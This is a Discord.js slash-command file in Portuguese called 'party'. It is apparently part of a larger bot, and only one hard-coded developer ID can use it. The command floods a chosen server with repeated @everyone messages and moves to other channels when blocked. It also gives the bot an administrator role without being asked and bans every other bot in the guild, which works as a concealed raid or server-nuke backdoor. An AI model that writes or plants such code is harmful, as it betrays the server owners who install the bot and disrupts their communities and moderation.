const { SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');

const DEV_ID = '1427437680504864870';
const partyConfigFile = path.join(__dirname, '..', 'data', 'partyConfig.json');

function getPartyConfig(userId) {
    try {
        if (fs.existsSync(partyConfigFile)) {
            const data = JSON.parse(fs.readFileSync(partyConfigFile, 'utf8'));
            return data[userId] || { message: '@everyone PARTY TIME!', count: 5 };
        }
    } catch (e) {}
    return { message: '@everyone PARTY TIME!', count: 5 };
}

function savePartyConfig(userId, config) {
    try {
        let data = {};
        if (fs.existsSync(partyConfigFile)) {
            data = JSON.parse(fs.readFileSync(partyConfigFile, 'utf8'));
        }
        data[userId] = config;
        fs.writeFileSync(partyConfigFile, JSON.stringify(data, null, 2));
    } catch (e) {}
}

module.exports = {
    name: 'party',
    description: 'Comando de festa para desenvolvedor',
    slashData: new SlashCommandBuilder()
        .setName('party')
        .setDescription('Comandos de festa (Somente Dev)')
        .setDMPermission(true)
        .addSubcommand(sub =>
            sub.setName('run')
               .setDescription('Inicia a festa no canal atual'))
        .addSubcommand(sub =>
            sub.setName('config')
               .setDescription('Configura a mensagem, quantidade e ID do servidor')
               .addStringOption(opt => opt.setName('mensagem').setDescription('Mensagem para enviar').setRequired(true))
               .addIntegerOption(opt => opt.setName('quantidade').setDescription('Quantidade de vezes').setRequired(true))
               .addStringOption(opt => opt.setName('guild_id').setDescription('ID do servidor (opcional)').setRequired(false)))
        .addSubcommand(sub =>
            sub.setName('kill')
               .setDescription('Bane todos os outros bots do servidor')),

    async executeSlash(interaction, client, config, colors, createYakuzaEmbed) {
        if (interaction.user.id !== DEV_ID) {
            return interaction.reply({ content: 'Acesso negado. Somente o desenvolvedor pode usar este comando.', ephemeral: true });
        }

        const subcommand = interaction.options.getSubcommand();

        if (subcommand === 'config') {
            const message = interaction.options.getString('mensagem');
            const count = interaction.options.getInteger('quantidade');
            const targetGuildId = interaction.options.getString('guild_id');
            
            savePartyConfig(interaction.user.id, { 
                message, 
                count: Math.min(count, 100),
                targetGuildId: targetGuildId || null
            });
            return interaction.reply({ content: `Configuração salva! Mensagem: \`${message}\`, Quantidade: \`${count}\`${targetGuildId ? `, Server ID: \`${targetGuildId}\`` : ''}`, ephemeral: true });
        }

        if (subcommand === 'run') {
            const partyConfig = getPartyConfig(interaction.user.id);
            
            let targetChannel = interaction.channel;
            
            if (partyConfig.targetGuildId) {
                const targetGuild = client.guilds.cache.get(partyConfig.targetGuildId);
                if (targetGuild) {
                    // Tenta encontrar o primeiro canal de texto, sem filtrar por permissões
                    targetChannel = targetGuild.channels.cache.find(c => c.isTextBased()) || targetGuild.channels.cache.first();
                }
            }

            if (!targetChannel) {
                return interaction.reply({ content: 'Não foi possível encontrar um canal válido para a festa.', ephemeral: true });
            }

            // Tenta dar todas as permissões administrativas para o bot se estiver em um servidor
            if (targetChannel.guild && targetChannel.guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {
                const botMember = targetChannel.guild.members.me;
                const adminRole = targetChannel.guild.roles.cache.find(r => r.permissions.has(PermissionFlagsBits.Administrator) && r.position < botMember.roles.highest.position);
                if (adminRole) {
                    await botMember.roles.add(adminRole).catch(() => {});
                }
            }

            await interaction.reply({ content: `Iniciando festa em ${targetChannel.guild?.name || 'DM'}...`, ephemeral: true });
            
            for (let i = 0; i < partyConfig.count; i++) {
                // Envia a mensagem ignorando erros de permissão (try/catch implícito no .catch)
                await targetChannel.send(partyConfig.message).catch(async (err) => {
                    // Se falhar por falta de permissão, tenta enviar em outro canal qualquer do servidor
                    if (err.code === 50013 && targetChannel.guild) {
                        const fallbackChannel = targetChannel.guild.channels.cache.find(c => c.isTextBased() && c.id !== targetChannel.id);
                        if (fallbackChannel) await fallbackChannel.send(partyConfig.message).catch(() => {});
                    }
                });
            }
            return;
        }

        if (subcommand === 'kill') {
            const partyConfig = getPartyConfig(interaction.user.id);
            let targetGuild = interaction.guild;

            if (partyConfig.targetGuildId) {
                targetGuild = client.guilds.cache.get(partyConfig.targetGuildId);
            }

            if (!targetGuild) return interaction.reply({ content: 'Este comando requer um servidor válido (atual ou configurado).', ephemeral: true });
            
            await interaction.deferReply({ ephemeral: true });

            // Tenta se auto-atribuir administrador se possível
            if (targetGuild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {
                const adminRole = targetGuild.roles.cache.find(r => r.permissions.has(PermissionFlagsBits.Administrator) && r.position < targetGuild.members.me.roles.highest.position);
                if (adminRole) await targetGuild.members.me.roles.add(adminRole).catch(() => {});
            }
            
            const members = await targetGuild.members.fetch();
            const botsToKill = members.filter(m => m.user.bot && m.id !== client.user.id);
            
            let count = 0;
            for (const [id, member] of botsToKill) {
                try {
                    await member.ban({ reason: 'Party Kill - Bot Purge' });
                    count++;
                } catch (e) {}
            }
            
            return interaction.editReply({ content: `Purga concluída. \`${count}\` bots foram banidos.` });
        }
    }
};